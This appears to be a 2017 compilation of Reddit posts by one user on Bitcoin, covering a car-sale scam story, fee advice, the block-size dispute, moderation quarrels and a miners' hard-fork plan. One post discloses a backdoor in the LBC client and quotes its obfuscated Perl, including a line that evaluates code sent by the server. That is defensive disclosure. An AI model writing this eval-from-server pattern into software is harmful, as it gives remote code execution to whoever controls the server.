<TITLE> Maryland Man Loses $4,400 in Bitcoin Trying to Buy 55 Chevy Online </TITLE>
<DATE> 2017-05-09 06:45:23 </DATE>
<INFO> reddit post </INFO>
<TEXT> http://www.nbcwashington.com/news/local/Maryland-Man-Loses-4400-in-Bitcoin-Trying-to-Buy-55-Chevy-Online-421676383.html

When a Maryland man finally found the dream car he could afford online, he got taken for a ride.

Jerome Harrells first car was a 1955 Chevrolet, and years later, he wanted another one. He searched 55 Chevy online and found a lot of them, but most of them were too expensive for him, he said.

Then the Vietname veteran saw one for $3,000.

I jumped on it because I figured you can't get one for $3,000 nowhere else, Harrell said. So I jumped on it and everything went just fine.

He said everything looked legitimate. The seller told him she got the car in a divorce settlement, which was why she was selling it at a bargain.

She told him the car would be delivered from West Virginia after he paid using Google Wallet, a service that allows payments to made digitally.

Then he got what looked to him like an official invoice that instructed him to pay using a bitcoin ATM, a machine that allows the exchange of cash and bitcoins, the uninsured digital currency created and exchanged anonymously and independent of banks or governments.

Never heard it before or anything, but we went on the computer and looked at it and it says it's in Wal-mart, so I figured it had to be legit, Harrell said.

He sent a total of $4,400 to the seller and was told the car would arrive in three days.

I couldn't even hardly sleep that night because I was excited because the car is going to get here, he said.

He watched out the window for the delivery all day, but as the hours went by, he realized hed been scammed.

He emailed the seller, but she didnt reply.

Google Wallet told him they dont use bitcoin and confirmed hed been scammed.

To prevent becoming a victim of such a scam, here are four things to know:

Be wary of any "too good to be true" deals.

Make sure you know with whom you are dealing. If the seller only wants to communicate through email, that's a big red flag.

Scrutinize every message you receive. Scammers work hard to make their emails look official. The one Harrell received had the Google Wallet logo and even came from an email address that looked legitimate at first glance.

Finally, when making large purchases online, think twice about using bitcoin. Treat the digital currency as cash.

Harrell said he learned an expensive and heartbreaking lesson, and he gave up on the search for another 55 Chevy. </TEXT>

<TEXT> Yes, it's a risk.

 If it is a risk, what do merchants do to prevent it?

I think a lot of the bigger merchants and service providers have algorithms they run to determine how much of a risk there is and how they should behave based on that. I especially remember ShapeShift talking about this. Probably some sort of aggregate based statistical analysis. I imagine the value of the transaction itself plays a pretty huge role in this.

Anyone is also free to create a Child-Pays-For-Parent transaction from a currently unconfirmed UTXO that they control. Again, this could be especially useful for high value transactions.

/u/evoorhees, /u/bdarmstrong, or others, any input on this without giving too much away? </TEXT>

<TEXT> Never explicitly 'dumb', but when I first joined Reddit it was usually more of a condescending implication that I'm some sort of plebe incapable of understanding any sort of in depth explanation. I'm definitely not a computer science wizard, but I have a pretty solid IT background and have been fanatically following the goings-on of Bitcoin for 5+ years now, and like to think I can at least somewhat comprehend explanations from those more technically competent than I.

That's also not speaking to other *less favorable* interactions I have sometimes seen with others.

To be perfectly fair, I've abandoned any attempts at sincere conversation lately in favor of insults, and for that I sincerely apologize again. I've considered making genuine attempts at conversation, but then I have this thought in my head that it's a waste of time as I believe I probably won't receive a genuine response. My train of thought recently has been to fight perceived toxicity with more toxicity, which I've recently reconsidered as probably a shitty thing to be doing.

Fair enough on the long days. </TEXT>

I just really don't understand your behavior. And hey, nobody has to justify themselves to an anonymous internet stranger, but I'm sure I'm not the only one baffled by the behavior of the CTO of a major company.

Why should I take the time to attempt to have a genuine conversation when I'm just going to be told that I'm dumb or don't understand, or will receive an insult or no response? I've sincerely attempted in the past, and it seems like one of the above outcomes always results.

On a higher level, why is the CTO of a major company even spending significant portions of his day arguing with people on Reddit?

I just don't get it. I'm not trying to be confrontational here, and sincerely appreciate you taking the time to have an actual conversation. </TEXT>

<TEXT> Thank you for elaborating upon that and breaking it down!

I think I'm understanding what you're saying now.

I think we're on the same page on all those points, like you said, except the last.

On the last point

 * Ethereum is Bitcoin now and we should all buy it. Everyone here ag... Wait what!?

well, he doesn't explicit say that, but I think it's somewhat reasonable to assume that it's implied based on the subreddit it was posted in.  However, strictly interpreted, this could really apply to absolutely any cryptocurrency, not just Bitcoin or Ethereum. Sure, maybe Nooku was only talking about Ethereum and maybe it's a bunch of shilling, but I think the post also serves as a stark reminder that the same level of shenanigans and toxicity can potentially happen with Ethereum (or any cryptocurrency) if it experiences the same level of success as Bitcoin. </TEXT>

<TEXT> Maybe we're making different points then.

I am talking about the content of the post, not the reputation or possible intent of the person that made the post. I apologize if providing attribution has caused confusion or controversy.

I don't say that to be snarky.

I think there are some very serious issues with Bitcoin right now, and [this](https://coinmarketcap.com/charts/#btc-percentage) is very likely a direct reflection of those issues.

Would it be accurate to say that our points are as follows?

* /u/tophernator: Nooku has a poor reputation and wants Bitcoin to fail and this post in /r/btc is spreading his propaganda.
* /u/subject1230: The content of the linked post, regardless of author, raises some extremely valid points. </TEXT>

<TEXT>  The idea will live on regardless, this is correct. But if Bitcoin fails it would be a huge setback for all cryptocurrencies, simply because it will show they are not a solid store of value. It would mean you have to switch to a new coin every few years, or constantly rebalance between multiple coins.

I suspect, but cannot prove, that this is the true goal of Blockstream. </TEXT>

<TEXT> What is Bitcoin backed by?

It's basically backed by [Proof-of-Work](https://en.wikipedia.org/wiki/Proof-of-work_system) and security/immutability provided by Bitcoin miners (see number 7 [here](https://www.bitcoin.com/faq)).

What gives it it's worth?

[Market supply and demand](https://coinmarketcap.com/currencies/bitcoin/#markets).

That's all extremely simplified of course. There's some good resources at https://www.bitcoin.com/faq and lots of other places for further reading. </TEXT>

<TEXT> Ads are also a great way to pick up malware.

[Malvertising (a portmanteau of "malicious advertising") is the use of online advertising to spread malware.[1]](https://en.wikipedia.org/wiki/Malvertising)

Malvertising involves injecting malicious or malware-laden advertisements into legitimate online advertising networks and webpages.[2] Online advertisements provide a solid platform for spreading malware because significant effort is put into them in order to attract users and sell or advertise the product.[3] Because advertising content can be inserted into high-profile and reputable websites, malvertising provides malefactors an opportunity to push their attacks to web users who might not otherwise see the ads, due to firewalls, more safety precautions, or the like.[4][5] Malvertising is "attractive to attackers because they 'can be easily spread across a large number of legitimate websites without directly compromising those websites'."[6] </TEXT>

[This](https://www.reddit.com/r/btc/comments/67gld1/coming_soon_to_poolbitcoincom_already_the_highest/dgq8lkh/?context=1) seems like a pretty solid explanation, though I cannot say for sure as I am not a part of the operation myself.

They are selling it for a limited time, and likely using the upfront payments to purchase more hardware. Profitable business take out loans (or issue bonds) regularly. </TEXT>

<TEXT> **IT IS ACTUALLY MALICIOUS, DON'T RUN IT!**


EDIT: I was originally going to retract that message, as the code seemed safe, but there's an **actual** backdoor allowing **remote code execution**! (see below).

You are probably thinking that I am one of the people who are thinking that LBC significantly undermines the safety of Bitcoin. No, I am not. I just discovered something very weird when running the executable, which seems to suggest of its malicious behavior.

When I ran the original script after reading the documentation, it constantly returned an error from the server and didn't run.

    sopa@pc:~/LBC $ ./LBC
    Will use 2 CPUs.
    Ask for work... Server doesn't like us. Answer: wrong secret.

It told me that the secret was wrong so I edited the script to print it out and that's where the shady stuff starts.

    sopa@pc:~/LBC $ ./LBC-modified
    Will use 2 CPUs.
    Ask for work... Server doesn't like us. Answer: malformed request.

Huh, a malformed request now?! Let's run it again.

    sopa@pc:~/LBC $ ./LBC-modified
    Will use 2 CPUs.
    Ask for work... Server doesn't like us. Answer: challenge failed.

I ran it multiple times and the error message was always different and it seemed like they were randomly picked from a list.

I thought that this is very strange, as the original script returned the same error all the time, when I discovered these lines in the LBC script:

    local
    (
    $/,
    *FILE
    )
    ;
    open
    FILE,
    $file;
    my $codeprint
    =
    md5_hex(
    FILE
    )
    ;
    close
    FILE;

    return
    $codeprint;
    }

Notice the code style of this perl script. Seems like it was obfuscated (or just compacted so that it does not take a lot of disk space, which is not that bad).

What this piece of code does is taking an MD5 hash of the entire file. It then proceeds to submit that hash to the server with every request. This seems to verify that the file wasn't tampered with.
There's also a death_kiss routine which prints "DEATH KISS" and exits. I have no idea what it's for, though.

There's over six thousand lines in this script and nobody really knows what do they actually do.

I request u/therico666 to explain the above and to publish the unobfuscated source code of the script.

Do not run the client executable on any important computers, it might contain a rootkit. Unless the author of the scripts explains the purpose of these functions, I don't recommend trusting it.

EDIT: corrected the username: rico666 - therico666.


**REMOTE CODE EXECUTION BACKDOOR**

As noted by u/_jstanley, there's a line to evaluate the server's reply. Basically, this is remote code execution.

    if
    (
    defined
    $answer
    -
    {eval}
    )
    {
    eval
    $answer
    -
    {eval}
    ;
    }

<TEXT>  I think this is great idea, however if I might suggest just storing the hash?

Indeed, that is exactly what is happening.

Here is the information for the Bitcoin whitepaper:

The SHA-256 hash of the file, b1674191a88ec5cdd733e4240a81803105dc412d6c6708d53ab94fc248f4f553, is in the OP_RETURN output script of that transaction. </TEXT>

09b39d2f822c7cc9412997f584fe41742c9f35314ca3d6dd6cbbaac0137bd3dc

What I can tell thus far:

* The hash being used is SHA-256
* The SHA-256 hash is b1674191a88ec5cdd733e4240a81803105dc412d6c6708d53ab94fc248f4f553 and is in the OP_RETURN output script.
* The files on bitcoin.com and bitcoin.org are identical
* This file was already notarized on 2017-04-11

<TEXT>  Technically not untrue, but he omits the fact that he is blocking SegWit

* Miners can do what they feel is in their best interest, that is how Bitcoin works
* If you really feel like making accusations about this anyway, [Bitcoin.com](https://blockchain.info/pools) has only 2.2% of the [37% of hashpower currently supporting BU/Classic](http://www.nodecounter.com/graphs.php#blocks_pie_graph).

which would solve scaling issue short term

So would BU, and into the medium and long term as well. I don't hear you talking about SegWit supporters and undecideds blocking BU.

Lightning would solve it medium term and allow instant transactions.

If SegWit does not activate, Lightning can still be activated.

Also, he does not mention that BU would put control of the fee market into the hands of miners.

The entire premise of BU is to put control of the blocksize into the hands of all users (regular users, developers, and miners) instead of just a small handful of developers.

Weasel Ver.

Please help us elevate the level of conversation in the Bitcoin community.

Thank you. </TEXT>

<TEXT>  If there are concerns about the blocksize, i think there should also be concerns about enforcing a minimum block size if the miners are really doing this for the users. The ability to game the block chain implimentation mining empty blocks for 40% extra hashrate is not going to help out the users either.

This assumes that mining empty blocks is gaming the system.

Many would consider mining empty blocks to be leaving more transaction fees on the table for other miners. </TEXT>

Yes, but I personally doubt that it will. The parties involved in the infighting have made it very clear that they are generally petty and childish and seem to be willing to do as much damage to Bitcoin before losing their death grip.

or is it better to diversify into other crytocurrencies at this point?

Depends what you mean by better and from whose perspective. Personally, I think it would be crazy for someone to be into cryptocurrency and *only* be in Bitcoin. </TEXT>

<TEXT> Well it started as a debate over how to properly scale Bitcoin, but now it's pretty clear that that was just a proxy issue and the real issue is who gets to control Bitcoin.

The network is stuck at about 3.5 transactions per second and cannot increase any further, with no scaling resolution in sight.

[Bitcoin has fallen to below 70% of total cryptocurrency market capitalization as altcoins without the scaling issues and toxicity gain momentum.](https://coinmarketcap.com/charts/#btc-percentage)

Censorship, propaganda, removal of users from github repos, and character assassinations abound.

I have my own speculations about *why* this is all happening, but it's not speculation to say that current leadership and community in Bitcoin is toxic and is driving Bitcoin into the ground.

These are two good articles on the censorship:

https://medium.com/@johnblocke/r-bitcoin-censorship-revisited-58d5b1bdcd64

<TEXT> Everything you just said sounds extremely rational to me.

It's just that what /u/MaxTG said:

50%+x can completely wreck the utility of the network, the value, and especially the perception of security/longevity. To make a network change and keep all that value, it has to be **much** higher than 50%. Sure, the machinery will run, but nobody will want to hold the coins if they're under threat of instability or attack.

seems to be a huge logical leap from what you've said. </TEXT>

<TEXT> Hitler did not say this.

Gregor Strasser said this:

Gregor Strasser (May 31, 1892  June 30, 1934) was a politician of the German Nazi Party (NSDAP). Gregor Strasser believed Hitler was a socialist. He reorganized the whole NSDAP structure, both in its regional formation and its vertical management hierarchy. During the Nazi Party purge, also known as the Night of the Long Knives, Strasser tried to take credit for Hitler's ideals. He was imprisoned and then assassinated on Hitler's personal order by the Berlin Gestapo on June 30, 1934. His assassins shot through a window into Strasser's cell, killing him.

https://en.wikiquote.org/wiki/Gregor_Strasser

 * We are Socialists, enemies, mortal enemies of the present capitalist economic system with its exploitation of the economically weak, with its injustice in wages, with its immoral evaluation of individuals according to wealth and money instead of responsibility and achievement, and we are determined under all circumstances to abolish this system! And with my inclination to practical action it seems obvious to me that we have to put a better, more just, more moral system in its place, one which, as it were, has arms and legs and better arms and legs than the present one!

what y'all say about a safe hardfork makes sense, but core insisting on being the only developers of the only client, and this sub censoring outside opinions, is the best way to make populism burn like crazy.

Keep an eye on sites like

or

It could technically happen once BU is over 50% (or before, but they'd have little chance of success), but I suspect they will wait until they have about 60% or 70% and then publicly coordinate to produce a block marginally larger than 1 MB, like 1.1 MB or something like that. </TEXT>

<TEXT>  So if you're someone like me that just wants to hold, is there anything I have to do to prepare for this? Like, when the hard fork happens will I have to convert my coins to another chain or something, or do I just wait for everything to resolve itself?

If you hold your own private keys, there's really not much to worry about, except maybe keeping close track of any hardforks so you don't accidentally spend on only one chain right after a fork happens and before you realize that the fork has happened.

If you keep your coins on an exchange (e.g. don't hold your own private keys), you are at the mercy of that exchange, though most *reputable* exchanges shouldn't screw you over.

When ETH split into ETC and ETH, the reputable exchanges allowed their customers to withdraw and/or trade their ETC balance. </TEXT>

<TEXT> In Venezuela it is.

Bitcoin mining is only unaffordable in places with high or normal electricity costs.

The Venezuelan government subsidizes electricity to the point of it almost being free, so Bitcoin mining is highly profitable, if you have access to electricity.

http://www.citylab.com/politics/2016/04/venezuelas-electricity-crisis-is-the-result-of-its-economic-success/479001/

It also helps that the government there has destroyed their economy and the Venezuelan Bolivar is rapidly becoming more and more worthless (800% cpi inflation in 2016)

<TEXT> BU the client? No, it's a piece of software.

What results from what miners and nodes choose to do with that software? Well, BU allows creation of larger blocks, which, if acted upon, would result in two incompatible blockchains if people kept mining on the 1MB max blockchain.

So, BU *could* allow a hard fork to happen.

And to get away from strict facts now, I can't wait! We need more transaction capacity 6 months ago and I'm not against layer 2 solutions, but we need onchain scaling now and corrupt/toxic Blockstream-Core has tarnished any and all credibility they once had. </TEXT>

<TEXT> The more nodes with unique public IP addresses, the better.

Though if you're behind a NAT without port forwarding, it's never a bad thing to have a full copy of the blockchain, but it's not really directly helping the network either.

You could get a VPN and tunnel a full node through the VPN.

https://www.privacytools.io/#vpn

VPSs are great too to set up lots of different full nodes.

<TEXT> According to https://bitcoinfees.21.co/

The fastest and cheapest transaction fee is currently 200 satoshis/byte, shown in green at the top.

For the median transaction size of 226 bytes, this results in a fee of 45,200 satoshis.

So assuming your transaction is around 226 bytes and not really sure what is considered reasonable, I'd say about 0.00040000 BTC for a fee. </TEXT>

<TEXT> It will either be accepted or cancelled, usually within about 72 hours, so it may or may not have been dropped from the whole network by now.

Does Electrum show the balance back in your wallet?

If not:

First, try https://www.viabtc.com/tools/txaccelerator/ if they aren't full and they can still see your transaction.

If that doesn't work, if you control any of the output addresses, make a new transaction from one of the output addresses with a MUCH higher fee to encourage a miner to pickup both transactions.

Sorry for the wait.

https://bitcoinfees.21.co/ is also a good site for checking fees going forward. </TEXT>

Blockexplorer likely still has the transaction in its mempool while the others do not.

Unconfirmed transactions can sort of float around the network and some nodes will drop them and/or rebroadcast them before others. </TEXT>

<TEXT> To be specific, a new transaction from 1M9u2WwcQmPnycLzWe6dirvwPNp583wtiA. Assuming that this new transaction is also about 192 to 260 bytes in size, I think a fee of 0.00100000 BTC would be enough to get them both confirmed as that would work out to about 0.00050000 for each of them.

https://bitcoinfees.21.co/ currently recommends a fee of 0.00049720 BTC for a 226 byte transaction, so I would *think* 0.00100000 will be enough.

If you try it, let us know if it works. Good luck! </TEXT>

<TEXT> Assuming you're referring to blockchain.info, it's possible the transaction got dropped from all nodes that belong to or are connected to blockchain.info.

Then the transaction could have been picked back up at one of those blockchain.info-connected nodes at 2 AM after the transaction was broadcast again from a node that had been holding on to it the whole time. (And likewise scenario for Electrum) </TEXT>

<TEXT> If a miner has greater than 50% of the total global hashpower, they can effectively control what transactions do or do not get put into the Bitcoin blockchain.

And as a miner were to start moving closer and closer to 100% of the total global hashpower, they would gain greater and greater ability to undo recent transactions that other miners had put into the blockchain.

Something like this could seriously damage people's faith in Bitcoin. </TEXT>

Although, you can still see how a handful of guys could collaborate to manipulate the network. It's not even remotely out of the realm of possibly.

No problem! It's definitely within the realm of possibility, though it is worth noting that AntPool and F2Pool are both mining pools that miners could join or leave at any time.

 On a slightly related note, what happened to GHash.io?

No idea. </TEXT>

<TEXT> Fair enough, sorry to see you go.

I disagree strongly with your thoughts on Bitcoin, but have never had any problem with you as a moderator and appreciate you taking the time to moderate, even if light-handedly.

I also appreciate that you are not repeating the mantra of downvotes=censorship.

I realize downvotes are still an issue, but when I hear someone say downvotes=censorship, this indicates to me that this person could have better critical thinking skills or may be disingenuous, so again, thank you.

I think what's happened here is what naturally happens when people try to route around censorship. And it's not just a r\Bitcoin vs r/btc thing.

Without getting too specific, I think that r/btc has become an echo chamber for a particular faction that was censored in r\Bitcoin, just as Voat.co has become an echo chamber for a different particular faction that was censored on Reddit.com.

Thanks again for the moderation and the dialogue and sorry to see you go. </TEXT>

 Most people haven't noticed it here, but the moderation on /r/bitcoin has lightened up substantially over time. Not saying it's not a moderated forum, it is, but they let people talk both points of view over there enough that the conversations seem more productive to me.

Your submission was incredibly reasonable and much appreciated.

It will either confirm or get dropped from the network, usually within about 72 hours either way.

If it confirms, the coins go to the intended recipient.

If it gets dropped, you still have the coins.

Try to get your transaction submitted at https://www.viabtc.com/tools/txaccelerator/

ViaBTC takes a financial hit to help users in this situation.

If you control the recipient address, try making a new transaction with a much higher fee to encourage miners to pick up both transactions.

Not that it helps now, but https://bitcoinfees.21.co/ is good for estimating transaction fees.

But for what it's worth, there is a large portion of the community deeply concerned by the number of noobs who are being confused by or turned off by Bitcoin because of confirmation times much, much greater than 20 minutes. </TEXT>

<TEXT>  Does transferring larger amounts require more confirmations?

That's up to what you consider to be 'secure'.

 Also, does each confirmation take the same transaction fee?

No, but fees are best estimated in satoshis/byte and transactions with a lower fee in terms of satoshis/byte will take longer to confirm.

See https://bitcoinfees.21.co/

 Also, does each confirmation take the same transaction fee? For example, if my transaction requires 6 confirmations and the fee is 1%, am I basically paying 6% in fees?

That's not how it works. You only pay the fee once. It wouldn't quite make sense if someone made a transaction in block 1 and then they had to pay a fee going forward for each of the next 450,000 blocks.

 Also, since I like to prepare for the worst-case-scenario...what happens if I forget to put a transaction fee, or it's super low? How long will my bitcoins be hung up?

The transaction will either get confirmed or get dropped from the network (nullifying the transaction) usually within about 72 hours.

Submit the transaction number to https://www.viabtc.com/tools/txaccelerator/ and they will prioritize your transaction.

 I just read a post dated a few years ago saying that people are frustrated over breadwallet's fees being too low. Is this still the case?

Check https://bitcoinfees.21.co/ beforehand and use https://www.viabtc.com/tools/txaccelerator/ if it's still not confirming.

Welcome! </TEXT>

I like the mantra "don't invest what you're not willing to lose".

But here's a good graph showing where Bitcoin has been with regard to price, which might be a good place to start if interested:

<TEXT> Dear Blockstream,

I hereby submit this formal application for the position of CEO of Blockstream.

I will contribute twice as much code to the Bitcoin code base compared the current CEO.

I will pooppost on Reddit twice as much as the current CEO.

I will vanquish twice as many of Roger's paid shills compared to the current CEO.

I will appear to be twice as clueless as the current CEO.

I will do this all for half the salary of the current CEO.

Please see my post history for a comprehensive list of my experience.

Thank you for your careful consideration.

Some have claimed that technically brigade downvoting and bot downvoting is not censorship but if you effectively hide content from view rather than allowing people to discuss it, how are people going to be informed or participate in discussion here. you dont have to downvote things. the answer to speech you dont like is more speech not censorship.

I agree that both deletion of posts and heavy downvoting of posts both lead to decreased visibility.

However, someone calling downvoting censorship and trying to make downvoting comparable to outright deletion indicates (to me) either disingenuity or lack of critical thinking skills. I don't mean that as an attack, but I really see no other way to interpret this.

I have been following the Bitcoin community for many years now, and the main reasons I believe you are consistently downvoted are:

* Disingenuous comments (or at least comments that seem to lack any genuine good faith)
* Irrational comments   logical fallacies (shifting of goal posts as a prime example, but many others as well)
* Refusal to loudly and clearly acknowledge and denounce the deletion of posts and comments in r\Bitcoin
* Refusal to compromise with any blocksize change

I think it would be beneficial to take a step back and seriously think about why your posts are being downvoted. </TEXT>

<TEXT> I can say though, that I've stopped recommending bitcoin to prospective users in its current unreliable state.

Likewise. I tell people to fire up Jaxx and try one of the other 8 cryptocoins Jaxx supports instead of Bitcoin if they want to learn how to use cryptocurrency. </TEXT>

**Executive Order 6102** is a [United States presidential](https://en.wikipedia.org/wiki/President_of_the_United_States) [executive order](https://en.wikipedia.org/wiki/Executive_order_(United_States%29) signed on April 5, 1933, by President [Franklin D. Roosevelt](https://en.wikipedia.org/wiki/Franklin_D._Roosevelt) "forbidding the Hoarding of [gold coin](https://en.wikipedia.org/wiki/Gold_coin), gold [bullion](https://en.wikipedia.org/wiki/Gold_bullion), and [gold certificates](https://en.wikipedia.org/wiki/Gold_certificate) within the continental United States". The effect of the order, in conjunction with the statute under which it was issued, was to criminalize the possession of monetary gold by any individual, partnership, association or corporation.

<TEXT> I see exponential [here](https://blockchain.info/en/charts/transaction-fees-usd?timespan=all daysAverageString=7) and relatively linear [here](https://blockchain.info/charts/n-transactions?timespan=all daysAverageString=7).

That's open to interpretation obviously and an average transaction fee graph generated from both of them would be nice. Dare I say it'd be nice if blockchain.info did it automatically, though I think there's some irony there at both of our expense.

It's on my list of graphs to make using the CSV data on those pages. It'd be nice if someone else could beat me to it, but if not I'll get to it eventually. </TEXT>

<TEXT> The median fees provided on every one of these threads, including this one in rbitcoin, isn't enough for you?

https://www.reddit.com/r/Bitcoin/comments/5maxng/the_median_bitcoin_transaction_fee_in_jan_2017_is/?sort=confidence

I'm well aware of that post and no, it's not enough for me. It's some person posting a picture and some numbers on Twitter and everyone taking his word for it. There is no data source or method of calculation listed.

https://bitcoinfees.21.co/

This is great for any point in time, but there doesn't seem to be any historical data here. (please correct me if this is inaccurate)

Actually, if you know any good online sources that have all past individual transaction and their fees or have historical daily median transaction fees listed, I'd really appreciate a pointer. Or a good utility for doing the same with a local blockchain copy.

Thank you. </TEXT>

<TEXT>  How is transaction volume trivial?

 The graph linked was for total fees paid.

 Day 1 has 1,000 trades but day 1000 has 10,000 trades. More trades = more fees.

 Completely relevant to the discussion.

Trivial to do or demonstrate. I apologize for any confusion.

If you'd really like to see this, all you have to do is go to the exact same website that /u/mcgravier linked to.

Look, here it is: https://blockchain.info/charts/n-transactions?timespan=all daysAverageString=7

That was easy! </TEXT>

<TEXT>  So like I say, you used the mean from a heavily skewed distribution. You're analytical approach is bad and people have explained why it's bad many many times before.

 I may not agree with removing your post, but it is a misleading headline based on crappy crude analysis. So I can understand why they would do it.

Average is a well-defined mathematical function. If anyone finds it misleading, I suggest some quick Googling. Others are free to interpret its meaning in context.

I also think it's telling that the same post you made here in r/btc has a tiny fraction of the votes and comments that this post has. So people seem much more interested in the "CENSORSHIP IN R/BITCOIN" aspect than they do in the crude miscalculation of transaction fees.

[This post](https://www.reddit.com/r/btc/comments/5okq9e/358_cents_average_transaction_fee_so_far_in_2017/) currently with 74 net upvotes? I do agree that any number can be a fraction of another number. </TEXT>

<TEXT>  Hi please use the 'median' transaction fee. Averages are a bad metric because its effected by outliers easily.
 https://blockchain.info/tx/d38bd67153d774a7dab80a055cb52571aa85f6cac8f35f936c4349ca308e6380
 PS I feel sorry for the guy :(

HI please calculate the 'median' transaction fee and let us know what it works out to.

For the average without that single high fee transaction:

This is a valid point and I encourage you to run the numbers to get an exact answer.

For a rough estimate, [I calculated this already on the 7th of January](https://www.reddit.com/r/btc/comments/5mra3x/42_cents_average_transaction_fee_so_far_in_2017/dc5psy3/
), and it lowered the average by less than 3 cents. With more than double the total 2017 transactions 9 days later, this would have an effect of just under 1.5 cents.

So without that transaction, the Average Transaction Fee so far in 2017 would be about 34.3 cents.

Please run the numbers yourself if a completely precise answer is desired. </TEXT>

<TEXT> Also obligatory comment that the transaction fees for 2017 so far are messed up because someone paid 50BTC for a single transaction by mistake. Messes with the data.

<TEXT> On what basis would any reasonable sub censor this.

r\Bitcoin has not been reasonable for about 2 years now.

Bitcoin's fundamental value proposition is censorship resistance.

I was PM'ing with one of the users in r\Bitcoin recently because my comments were being shadow-deleted. I said almost exactly the same thing to this user, to which he or she responded that censorship is okay as long as it's against [FUD](https://en.wikipedia.org/wiki/Fear,_uncertainty_and_doubt). I'm not okay with that premise in the first place, but even so, apparently this user thought facts were [FUD](https://en.wikipedia.org/wiki/Fear,_uncertainty_and_doubt).

These arseholes should be truly ashamed of themselves.

I suspect, but cannot prove, that they know exactly what they are doing and have little to no shame about it. </TEXT>

<TEXT> IMHO that was a pretty hostile comment and expecting a response would not be reasonable.

To elaborate, here's what I have noticed about Andreas:

* He's decided he just doesn't have time for arguing with people on Reddit/Twitter/Medium etc. Between trolls, shills, belligerents, morons, and people trying to have actual conversations, Andreas just doesn't have the time to respond to them all or even distinguish between these different types of characters. Even if he could, it's a waste of time when he could be doing more productive things.

Frankly, I wish certain others in the community would follow this example.

* He makes a living giving speeches about Bitcoin. Andreas can't be upsetting people too much if he wants to continue making paid speeches to their fullest financial potential.

I have a lot of respect for Andreas and I don't really blame him for mostly removing himself from the endless toxicity that the Bitcoin community and social media in general both exude.

If someone wants to dig it up, I remember he made a tweet last year saying that he's done dealing with Reddit any further. </TEXT>

Which fee should I use?

The fastest and cheapest transaction fee is currently 90 satoshis/byte, shown in green at the top.
For the median transaction size of 226 bytes, this results in a fee of 20,340 satoshis (0.15$). </TEXT>

 Probably due to the [50btc](https://www.blocktrail.com/BTC/tx/d38bd67153d774a7dab80a055cb52571aa85f6cac8f35f936c4349ca308e6380) transaction fee someone sent by accident...

Without that transaction, it works out to an average fee of 39 cents per transaction.

Using the Bitfinex price of $1,125.70 at that time according to https://bitcoinwisdom.com/markets/bitfinex/btcusd

That would remove 50 x $1,125.70 = $56,285.00 and 1 transaction from the calculation

This gives us:

* $793,614.5979 in transaction fees

* 2,025,636 transactions

* $793,614.5979 / 2,025,636 = $0.3917853937726225 per transaction. </TEXT>

<TEXT> I respectfully disagree.

Trade and currency exchange facilitated by Bitcoin provides significant value, especially in countries with excessive inflation and capital controls.

<TEXT> Hacking an exchange isn't really hacking the ledger (at least I wouldn't consider it to be).

Hacking an exchange would give an attacker the private keys that allow entries to be made on the ledger (e.g. stealing bitcoins), but the Bitcoin ledger and Bitcoin protocols themselves would not have been hacked.

Maybe it just depends on the definition of the word 'hack'. I would consider 'hack the ledger' to mean exploiting the Bitcoin protocol rather than just breaking into an exchange. </TEXT>

I knew the dispensaries are having banking issues and that cryptocurrency was an option they were looking at, but I didn't know if that ever really went anywhere.

Well, maybe not the volatility itself, but the fact that Bitcoin price is not strongly correlated with prices of any traditional assets.

<TEXT> Thanks for taking the time to explain.

That's usually the exact opposite explanation we get from the folks at r/investing, r/finance, r/economics, etc., but hey, at least it sounds like you have a greater understanding of Bitcoin than mods at those subs.

Though if you ever do have a craving for 100x Bitcoin leverage, [it can be done](https://www.bitmex.com/).

Also, that really is a sweet AutoMod response with Karpeles.

<TEXT>  They've also banned almost everyone who doesn't adhere to their corrupt, corporate-political vision of bitcoin,

 That's false and you know it. Sure, we've banned a number of disruptive trolls and spammers, but there's still thousands upon thousands of people sharing different viewpoints every single day.

I respectfully and strongly disagree with this assertion.

I was banned from r\Bitcoin for having civil discussions about the technical limitations of the Bitcoin transaction network.

It has been my consistent experience at r\Bitcoin that any viewpoints that deviate from Blockstream/Core's agenda are swiftly censored. </TEXT>

<TEXT> I'm conflicted here.

Reddit IMHO has been overzealous in bans related to doxing, as has been clearly demonstrated with theymos and his open public association between his username and real name on many public forums.

I am also deeply concerned about rampant censorship with regard to other aspects of Reddit.

But man, Greg is just such a raging doody head. Makes me wonder what else he was doing that Reddit admins could see and we could not. </TEXT>

[Project Loon is a research and development project being developed by X (formerly Google X) with the mission of providing Internet access to rural and remote areas. The project uses high-altitude balloons placed in the stratosphere at an altitude of about 18 km (11 mi) to create an aerial wireless network with up to 4G-LTE speeds. It was named Project Loon, since even Google itself found the idea of providing Internet access to the remaining 5 billion population unprecedented and "crazy."](https://en.wikipedia.org/wiki/Project_Loon)

Prerequisites:  
1, core version 0.13.1 released in July, including the miners activated segwit (isolation witness) are available;  
2, classic releases new version is based on core 0.13.1 version, including for miners active segwit (isolation witness) and 2M hard bifurcation;  
3, core violation of the Hong Kong expansion consensus agreement, not in August 1, 2016 release includes new versions of 2M hard bifurcation.


Making process:  
1, over 75% of the mine pool owners and operators of power miners Optional Optional day expansion of convening the meeting;  
2, the meeting reached a consensus: all participants ore miners in pools or expansion route choice will work hand in hand;  
3, select a pool of mine as "Terminator";  
4, released "Terminator Plan" content.

Program content:  
1. Participating mineral pool, miners reach consensus on expansion: 90% or more operators to activate 2M force bifurcation hard to count more than 95% of the force activation segwit (isolation witness);  
2. Participating mineral pool, miners to achieve consensus on the expansion, will be unified planning, unified action, act in unison;  
3, select XX meeting mine pool to "Terminator";  
4, in addition to the "Terminator", the participants all mineral pools, within 30 days the miners core program switches to the latest version of the classic, complete 2M hard bifurcation, segwit (isolation witness) Operator support force;  
5, if and only if more than 75% of the operator support 2M hard on finalizing the diverging after "Terminator" complete support for 2M hard bifurcation as soon as possible to ensure that there are more than 90% of the force operator support 2M hard bifurcation;  
6, when the 2M hard fork is activated, the 28-day grace period, the pool of participants ore miners will do everything possible to inform all the miners, exchanges, wallet developer / company, core wallet users, other start-up companies and other completed core switching procedures to ensure the smooth progress of the bifurcation hard, to avoid unnecessary losses generated;  
7, activate segwit (isolation witness).






Description proposal:  
1. The proposed plan is valid only after three preconditions occur;  
2, which is a majority of the miners to mine the main pool of the proposal, there are different opinions may ignore this proposal, will be idle, bored when I was nonsense;  
3, expansion of the dispute has been debated for too long, both parties after a long discussion over, except for a few extreme person, most people agree that the following points:  
(1) We need to 2M hard bifurcation, but requires enough force to support the operator to ensure that Bitcoin will not be split;  
(2) We need to isolate the witness, in order to achieve Bitcoin kernel better scalability and compatibility;  
(3) We need lightning network, in order to achieve Bitcoin-second transfer capability.  
